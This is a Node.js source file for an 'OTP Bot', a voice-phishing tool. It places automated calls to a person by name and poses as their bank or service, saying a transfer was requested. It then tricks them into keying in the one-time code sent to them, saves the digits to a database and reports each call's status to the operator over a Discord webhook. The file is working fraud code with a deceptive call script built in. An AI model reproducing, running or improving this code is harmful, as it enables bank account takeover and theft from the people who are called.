const config = require('../config');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook(config.discordwebhook || '');
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./db/data.db');

module.exports = function(request, response) {
    const input = request.body.RecordingUrl || request.body.Digits || "0";
    const callSid = request.body.CallSid;

    if (!callSid) {
        return response.status(200).json({ error: 'Please give us the callSid.' });
    }

    db.get('SELECT service, name, otplength FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        const service = row.service || 'default';
        const name = row.name || '';
        const otplength = row.otplength || '6';
        const endurl = config.serverurl + '/stream/end';
        const askurl = config.serverurl + '/stream/' + service;
        const numdigits = otplength;

        const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Say voice="Polly.Joanna">Your account is now secured. Thank You!</Say></Response>';
        const ask = `<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="15" numDigits="${numdigits}"><Pause length="2"/><Say voice="Polly.Joanna"><prosody rate="slow">For security reasons we have to verify You are the real owner of this account in order to block this request. Please dial the ${numdigits} digit code we just sent you.</prosody></Say></Gather></Response>`;

        const otpsend = `<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="1"><Pause length="4"/><Say voice="Polly.Joanna"><prosody rate="slow">Hello ${row.name}, Welcome to ${row.service} We have recently received a request to process a transfer scheduled  on your account. If this was not you please press 1, If this was you please press 2.</prosody></Say></Gather></Response>`;
        const otpSendEnd = end;

        length = service == 'banque' ? 8 : otplength;
        db.get('SELECT * FROM calls WHERE callSid = ?', [request.body.CallSid], (err, row) => {
            if (err) {
                return console.log(err.message);
            }

            if (row.otpsend == 0 && !input.match(/^[1-2]$/)) {
                respond(otpsend);
            } else if (row.otpsend == 0 && input.match(/^[1-2]$/)) {
                if (input == 1) {
                    db.run(`UPDATE calls SET otpsend = 1 WHERE callSid = ?`, [request.body.CallSid], function(err) {
                        if (err) {
                            return console.log(err.message);
                        }
                    });

                    const embed = new MessageBuilder()
                        .setTitle(`OTP Bot`)
                        .setColor('15158332')
                        .setDescription('Status: **Send OTP**')
                        .setFooter(row.user)
                        .setTimestamp();
                    hook.send(embed);

                    respond(ask);
                } else {
                    const embed = new MessageBuilder()
                        .setTitle(`:mobile_phone: ${row.itsto}`)
                        .setColor('15158332')
                        .setDescription('Status: **User pressed 2 (Exit)**')
                        .setFooter(row.user)
                        .setTimestamp();
                    hook.send(embed);
                    respond(otpSendEnd);
                }
            } else {
                if (input.length == length && input.match(/^[0-9]+$/)) {
                    respond(end);
                    db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                        if (err) {
                            return console.log(err.message);
                        }
                    });
                } else {
                    respond(ask);
                }
            }
        });
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};
